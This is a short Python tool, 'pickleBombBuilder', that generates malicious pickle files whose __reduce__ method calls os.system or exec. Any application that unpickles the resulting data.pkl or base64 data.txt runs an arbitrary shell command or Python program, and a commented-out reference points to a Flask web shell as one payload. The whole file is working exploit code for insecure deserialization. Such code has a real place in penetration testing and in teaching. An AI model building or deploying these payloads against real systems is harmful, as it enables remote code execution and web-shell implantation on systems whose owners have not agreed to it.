# A normal pickle bomb serialized file creation program. 
# version: v0.0.3
# Create: 06/07/2024
# by Liu Yuancheng
import os
import sys
import pickle
import base64

# Serilized file:
#testfileName = 'flaskWebShellApp.py'

usageDoc = """
Usage: 
    -c : build cmd bomb: python pickleBombBuilder.py -c <Command string>
    -f : build code bomb: python pickleBombBuilder.py -f <Python program file name>
    -h : help
"""
obj = None      # the object to be serialized
cmdStr = ''     # command string
dataStr = ''    # python code string
byteOutputFileName = 'data.pkl' # byte format pickle bomb file
textOutputFilename = 'data.txt' # text format pickle bomb file

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
class PickeCmdBomb:
    def __reduce__(self):
        global cmdStr
        return os.system, (cmdStr,)

class PickleCodeBomb:
    def __reduce__(self):
        global dataStr
        return exec, (dataStr,)

#-----------------------------------------------------------------------------
if len(sys.argv) <= 1 or sys.argv[1] == '-h':
    print(usageDoc)
else: 
    if sys.argv[1] == '-c':
        cmdlist = sys.argv[2:]
        cmdStr = (' '.join(cmdlist))
        obj = PickeCmdBomb()
    elif sys.argv[1] == '-f':
        fileName = sys.argv[2:]
        fileNameStr = ' '.join(fileName)
        if not os.path.exists(fileNameStr):
            print("Error: file %s not found, exiting..." % fileNameStr)
            exit()
        try:
            with open(fileNameStr, 'r') as fh:
                dataStr = fh.read()
            obj = PickleCodeBomb()
        except Exception as err:
            print("Error: can not read python file %s" % err)
            exit()
    print("Serialized data ...")
    pickledata = pickle.dumps(obj, protocol=pickle.HIGHEST_PROTOCOL)

    print(" - Build the bytes serialize data file: %s" % byteOutputFileName)
    try:
        with open(byteOutputFileName, 'wb') as handle:
            pickle.dump(obj, handle, protocol=pickle.HIGHEST_PROTOCOL)
    except Exception as err:
        print("Error: can not write file %s" % byteOutputFileName)
        print("Error: %s" % err)

    print(" - Build the text serialize data file: %s" % textOutputFilename)
    try:
        dataStr = base64.b64encode(pickledata).decode('ascii')
        with open(textOutputFilename, 'w') as fh:
            fh.write(dataStr)
    except Exception as err:
        print("Error: can not write file %s" % textOutputFilename)
        print("Error: %s" % err)

    print('Finished')
